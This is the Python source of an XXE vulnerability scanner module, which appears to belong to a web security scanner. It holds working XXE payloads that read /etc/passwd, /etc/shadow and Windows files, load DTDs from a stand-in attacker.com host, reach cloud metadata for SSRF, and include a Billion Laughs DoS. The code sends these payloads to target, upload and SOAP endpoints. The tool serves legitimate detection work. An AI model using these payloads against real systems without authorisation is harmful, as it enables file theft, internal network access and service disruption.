# scanner/xxe/xxe.py
"""
XXE (XML External Entity) Injection Scanner

Detects XML External Entity vulnerabilities that can lead to:
- Local file disclosure
- Server-Side Request Forgery
- Denial of Service
- Remote code execution (in some cases)

OWASP: A05:2021 - Security Misconfiguration (previously A4:2017 - XXE)
CWE-611: Improper Restriction of XML External Entity Reference
"""

import asyncio
import aiohttp
from typing import List, Dict, Optional
from urllib.parse import urljoin, urlparse
import re

from ..base import BaseScanner, Vulnerability, Severity, OWASPCategory


class XXEScanner(BaseScanner):
    """Scanner for XML External Entity (XXE) injection vulnerabilities"""

    name="XXE Scanner",
    description="Detects XML External Entity injection vulnerabilities",
    owasp_category=OWASPCategory.A05_SECURITY_MISCONFIGURATION
    
    def __init__(self):
        # XXE payloads for different attack types
        self.payloads = {
            # Basic XXE - File disclosure (Linux)
            "file_linux": [
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>''',
                
                '''<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/shadow">]>
<data>&file;</data>''',
                
                '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<foo>&xxe;</foo>''',
            ],
            
            # Basic XXE - File disclosure (Windows)
            "file_windows": [
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>''',
                
                '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
<foo>&xxe;</foo>''',
            ],
            
            # XXE via parameter entities
            "parameter_entity": [
                '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<foo>test</foo>''',
                
                '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %exfil;
]>
<foo>test</foo>''',
            ],
            
            # Blind XXE with external DTD
            "blind_external": [
                '''<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/xxe.dtd">
<foo>test</foo>''',
                
                '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
<foo>test</foo>''',
            ],
            
            # XXE SSRF
            "ssrf": [
                '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>''',
                
                '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:22">]>
<foo>&xxe;</foo>''',
                
                '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">]>
<foo>&xxe;</foo>''',
            ],
            
            # XXE Denial of Service (Billion Laughs)
            "dos_billion_laughs": [
                '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>''',
            ],
            
            # XInclude attacks
            "xinclude": [
                '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>''',
                
                '''<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="http://attacker.com/evil.xml"/></root>''',
            ],
            
            # SVG-based XXE
            "svg": [
                '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>''',
            ],
            
            # SOAP-based XXE
            "soap": [
                '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <data>&xxe;</data>
  </soap:Body>
</soap:Envelope>''',
            ],
        }
        
        # Indicators of successful XXE
        self.success_indicators = {
            "file_linux": [
                r"root:.*:0:0:",           # /etc/passwd
                r"daemon:.*:",
                r"nobody:.*:",
                r"\[boot loader\]",         # Error message indicating file access
            ],
            "file_windows": [
                r"\[extensions\]",          # win.ini
                r"\[fonts\]",
                r"localhost",               # hosts file
                r"127\.0\.0\.1",
            ],
            "ssrf": [
                r"ami-",                    # AWS metadata
                r"instance-id",
                r"local-hostname",
                r"Connection refused",      # Port scanning indication
                r"Connection timed out",
            ],
            "error_based": [
                r"SYSTEM.*file://",
                r"failed to load external entity",
                r"xmlParseEntityRef",
                r"Start tag expected",
                r"DOCTYPE.*not allowed",
                r"XML parsing error",
                r"SAXParseException",
            ],
        }
        
        # Content-Types that accept XML
        self.xml_content_types = [
            "application/xml",
            "text/xml",
            "application/xhtml+xml",
            "application/soap+xml",
            "application/rss+xml",
            "application/atom+xml",
            "image/svg+xml",
        ]
    
    async def scan(
        self,
        session: aiohttp.ClientSession,
        url: str,
        params: Dict[str, str] = None
    ) -> List[Vulnerability]:
        """
        Scan for XXE vulnerabilities.
        
        Args:
            session: aiohttp client session
            url: Target URL
            params: Parameters to test (used as XML data points)
            
        Returns:
            List of discovered XXE vulnerabilities
        """
        vulnerabilities = []
        
        # Test XML endpoints
        xml_vulns = await self._test_xml_endpoint(session, url, params)
        vulnerabilities.extend(xml_vulns)
        
        # Test file upload endpoints for SVG XXE
        svg_vulns = await self._test_svg_xxe(session, url)
        vulnerabilities.extend(svg_vulns)
        
        # Test SOAP endpoints
        soap_vulns = await self._test_soap_endpoint(session, url)
        vulnerabilities.extend(soap_vulns)
        
        return vulnerabilities
    
    async def _test_xml_endpoint(
        self,
        session: aiohttp.ClientSession,
        url: str,
        params: Dict[str, str] = None
    ) -> List[Vulnerability]:
        """Test endpoint with XML payloads"""
        vulnerabilities = []
        
        for payload_type, payloads in self.payloads.items():
            # Skip DoS payloads by default (can be enabled separately)
            if "dos" in payload_type:
                continue
            
            for payload in payloads:
                for content_type in self.xml_content_types[:3]:  # Test main XML types
                    try:
                        vuln = await self._send_xxe_payload(
                            session, url, payload, content_type, payload_type
                        )
                        if vuln:
                            vulnerabilities.append(vuln)
                            # Found vulnerability with this payload type, move to next
                            break
                    except Exception:
                        continue
                
                if vulnerabilities:
                    break  # Found vulnerability, no need to test more payloads
        
        return vulnerabilities
    
    async def _send_xxe_payload(
        self,
        session: aiohttp.ClientSession,
        url: str,
        payload: str,
        content_type: str,
        payload_type: str
    ) -> Optional[Vulnerability]:
        """Send XXE payload and analyze response"""
        try:
            headers = {
                "Content-Type": content_type,
                "Accept": "*/*",
            }
            
            async with session.post(
                url,
                data=payload,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=10),
                ssl=False
            ) as response:
                response_text = await response.text()
                
                # Check for success indicators
                vuln_found, evidence = self._check_xxe_indicators(
                    response_text, payload_type
                )
                
                if vuln_found:
                    return Vulnerability(
                        vuln_type="XXE Injection",
                        severity=Severity.HIGH if "file" in payload_type else Severity.MEDIUM,
                        url=url,
                        parameter="XML Body",
                        payload=payload[:200],
                        evidence=evidence,
                        description=self._get_xxe_description(payload_type),
                        cwe_id="CWE-611",
                        remediation=self._get_xxe_remediation()
                    )
                
                # Check for error-based XXE indicators
                error_found, error_evidence = self._check_xxe_indicators(
                    response_text, "error_based"
                )
                
                if error_found:
                    return Vulnerability(
                        vuln_type="XXE Injection (Error-based)",
                        severity=Severity.MEDIUM,
                        url=url,
                        parameter="XML Body",
                        payload=payload[:200],
                        evidence=error_evidence,
                        description="XML parser error suggests potential XXE vulnerability",
                        cwe_id="CWE-611",
                        remediation=self._get_xxe_remediation()
                    )
        
        except asyncio.TimeoutError:
            # Timeout might indicate blind XXE or DoS
            pass
        except Exception:
            pass
        
        return None
    
    async def _test_svg_xxe(
        self,
        session: aiohttp.ClientSession,
        url: str
    ) -> List[Vulnerability]:
        """Test for SVG-based XXE in file upload endpoints"""
        vulnerabilities = []
        
        # Common file upload endpoints
        upload_paths = [
            "/upload", "/api/upload", "/file/upload",
            "/image/upload", "/avatar/upload", "/media/upload",
            "/api/v1/upload", "/api/files", "/attachments"
        ]
        
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        svg_payload = self.payloads["svg"][0]
        
        for path in upload_paths:
            upload_url = urljoin(base_url, path)
            
            try:
                # Try multipart form upload
                data = aiohttp.FormData()
                data.add_field(
                    'file',
                    svg_payload,
                    filename='test.svg',
                    content_type='image/svg+xml'
                )
                
                async with session.post(
                    upload_url,
                    data=data,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    if response.status in [200, 201]:
                        response_text = await response.text()
                        
                        vuln_found, evidence = self._check_xxe_indicators(
                            response_text, "file_linux"
                        )
                        
                        if vuln_found:
                            vulnerabilities.append(Vulnerability(
                                vuln_type="SVG XXE Injection",
                                severity=Severity.HIGH,
                                url=upload_url,
                                parameter="file upload (SVG)",
                                payload=svg_payload[:100],
                                evidence=evidence,
                                description="SVG file upload processes XML and is vulnerable to XXE",
                                cwe_id="CWE-611",
                                remediation="Sanitize SVG files before processing. Disable external entity processing."
                            ))
                            break
            
            except Exception:
                continue
        
        return vulnerabilities
    
    async def _test_soap_endpoint(
        self,
        session: aiohttp.ClientSession,
        url: str
    ) -> List[Vulnerability]:
        """Test SOAP endpoints for XXE"""
        vulnerabilities = []
        
        # Common SOAP endpoint paths
        soap_paths = [
            "/soap", "/ws", "/wsdl", "/service", "/api/soap",
            "/services", "/webservice", "?wsdl"
        ]
        
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        for path in soap_paths:
            soap_url = urljoin(base_url, path)
            
            for payload in self.payloads["soap"]:
                try:
                    headers = {
                        "Content-Type": "application/soap+xml; charset=utf-8",
                        "SOAPAction": '""',
                    }
                    
                    async with session.post(
                        soap_url,
                        data=payload,
                        headers=headers,
                        timeout=aiohttp.ClientTimeout(total=10),
                        ssl=False
                    ) as response:
                        response_text = await response.text()
                        
                        vuln_found, evidence = self._check_xxe_indicators(
                            response_text, "file_linux"
                        )
                        
                        if vuln_found:
                            vulnerabilities.append(Vulnerability(
                                vuln_type="SOAP XXE Injection",
                                severity=Severity.HIGH,
                                url=soap_url,
                                parameter="SOAP Body",
                                payload=payload[:150],
                                evidence=evidence,
                                description="SOAP endpoint is vulnerable to XXE injection",
                                cwe_id="CWE-611",
                                remediation=self._get_xxe_remediation()
                            ))
                            return vulnerabilities
                
                except Exception:
                    continue
        
        return vulnerabilities
    
    def _check_xxe_indicators(
        self,
        response: str,
        indicator_type: str
    ) -> tuple[bool, str]:
        """Check response for XXE success indicators"""
        indicators = self.success_indicators.get(indicator_type, [])
        
        for pattern in indicators:
            match = re.search(pattern, response, re.IGNORECASE)
            if match:
                # Extract context around the match
                start = max(0, match.start() - 50)
                end = min(len(response), match.end() + 50)
                evidence = response[start:end]
                return True, evidence
        
        return False, ""
    
    def _get_xxe_description(self, payload_type: str) -> str:
        """Get description based on payload type"""
        descriptions = {
            "file_linux": "XXE vulnerability allows reading local files on Linux server",
            "file_windows": "XXE vulnerability allows reading local files on Windows server",
            "parameter_entity": "XXE via parameter entities allows data exfiltration",
            "blind_external": "Blind XXE allows external DTD loading for data exfiltration",
            "ssrf": "XXE can be used for Server-Side Request Forgery",
            "xinclude": "XInclude attack allows file inclusion",
            "svg": "SVG processing is vulnerable to XXE",
            "soap": "SOAP endpoint is vulnerable to XXE injection",
        }
        return descriptions.get(payload_type, "XML External Entity injection vulnerability detected")
    
    def _get_xxe_remediation(self) -> str:
        """Get XXE remediation advice"""
        return """
1. Disable external entity processing in XML parsers
2. Use less complex data formats (JSON) where possible
3. Patch or upgrade XML processors and libraries
4. Implement server-side input validation
5. Use SAST tools to detect XXE in source code

For specific languages:
- Java: setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
- PHP: libxml_disable_entity_loader(true)
- Python: defusedxml library
- .NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit
"""